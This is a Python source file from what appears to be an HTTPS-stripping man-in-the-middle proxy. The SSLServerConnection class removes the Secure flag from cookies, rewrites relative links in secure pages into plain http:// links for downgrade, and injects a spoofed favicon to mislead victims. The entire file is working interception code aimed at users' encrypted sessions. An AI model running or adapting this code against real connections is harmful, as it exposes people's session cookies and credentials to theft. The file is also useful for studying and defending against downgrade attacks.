# Copyright (c) 2004-2009 Moxie Marlinspike
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License as
# published by the Free Software Foundation; either version 3 of the
# License, or (at your option) any later version.
#

import logging
import re
from .ServerConnection import ServerConnection


class SSLServerConnection(ServerConnection):
    """
    For SSL connections to a server, we need to do some additional stripping.  First we need
    to make note of any relative links, as the server will be expecting those to be requested
    via SSL as well.  We also want to slip our favicon in here and kill the secure bit on cookies.
    """

    cookieExpression = re.compile(rb"([ \w\d:#@%/;$()~_?\+-=\\\.&]+); ?Secure", re.IGNORECASE)
    cssExpression = re.compile(rb"url\(([\w\d:#@%/;$~_?\+-=\\\.&]+)\)", re.IGNORECASE)
    iconExpression = re.compile(rb"<link rel=\"shortcut icon\" .*href=\"([\w\d:#@%/;$()~_?\+-=\\\.&]+)\".*>",
                                re.IGNORECASE)
    linkExpression = re.compile(
        rb"<((a)|(link)|(img)|(script)|(frame)) .*((href)|(src))=\"([\w\d:#@%/;$()~_?\+-=\\\.&]+)\".*>", re.IGNORECASE)
    headExpression = re.compile(rb"<head>", re.IGNORECASE)

    def __init__(self, command, uri, postData, headers, client):
        ServerConnection.__init__(self, command, uri, postData, headers, client)

    def getLogLevel(self):
        return logging.INFO

    def getPostPrefix(self):
        return "SECURE POST"

    def handleHeader(self, key, value):
        # Ensure key/value are bytes
        if isinstance(key, str): key = key.encode('utf-8')
        if isinstance(value, str): value = value.encode('utf-8')

        if key.lower() == b'set-cookie':
            value = SSLServerConnection.cookieExpression.sub(rb"\g<1>", value)

        ServerConnection.handleHeader(self, key, value)

    def stripFileFromPath(self, path):
        # path is bytes
        if isinstance(path, str): path = path.encode('utf-8')
        (strippedPath, lastSlash, file) = path.rpartition(b'/')
        return strippedPath

    def buildAbsoluteLink(self, link):
        # link is bytes
        if isinstance(link, str): link = link.encode('utf-8')
        absoluteLink = b""
        
        # Ensure host header is bytes
        host = self.headers.get(b'host') or self.headers.get('host')
        if isinstance(host, str): host = host.encode('utf-8')
        
        # Ensure uri is bytes
        uri = self.uri
        if isinstance(uri, str): uri = uri.encode('utf-8')

        if (not link.startswith(b'http')) and (not link.startswith(b'/')):
            absoluteLink = b"http://" + host + self.stripFileFromPath(uri) + b'/' + link

            logging.debug("Found path-relative link in secure transmission: " + link.decode('utf-8', 'ignore'))
            logging.debug("New Absolute path-relative link: " + absoluteLink.decode('utf-8', 'ignore'))
        elif not link.startswith(b'http'):
            absoluteLink = b"http://" + host + link

            logging.debug("Found relative link in secure transmission: " + link.decode('utf-8', 'ignore'))
            logging.debug("New Absolute link: " + absoluteLink.decode('utf-8', 'ignore'))

        if not absoluteLink == b"":
            absoluteLink = absoluteLink.replace(b'&amp;', b'&')
            self.urlMonitor.addSecureLink(self.client.getClientIP(), absoluteLink)

    def replaceCssLinks(self, data):
        iterator = re.finditer(SSLServerConnection.cssExpression, data)

        for match in iterator:
            self.buildAbsoluteLink(match.group(1))

        return data

    def replaceFavicon(self, data):
        match = re.search(SSLServerConnection.iconExpression, data)

        if match != None:
            data = re.sub(SSLServerConnection.iconExpression,
                          rb'<link rel="SHORTCUT ICON" href="/favicon-x-favicon-x.ico">', data)
        else:
            data = re.sub(SSLServerConnection.headExpression,
                          rb'<head><link rel="SHORTCUT ICON" href="/favicon-x-favicon-x.ico">', data)

        return data

    def replaceSecureLinks(self, data):
        data = ServerConnection.replaceSecureLinks(self, data)
        data = self.replaceCssLinks(data)

        if self.urlMonitor.isFaviconSpoofing():
            data = self.replaceFavicon(data)

        iterator = re.finditer(SSLServerConnection.linkExpression, data)

        for match in iterator:
            self.buildAbsoluteLink(match.group(10))

        return data
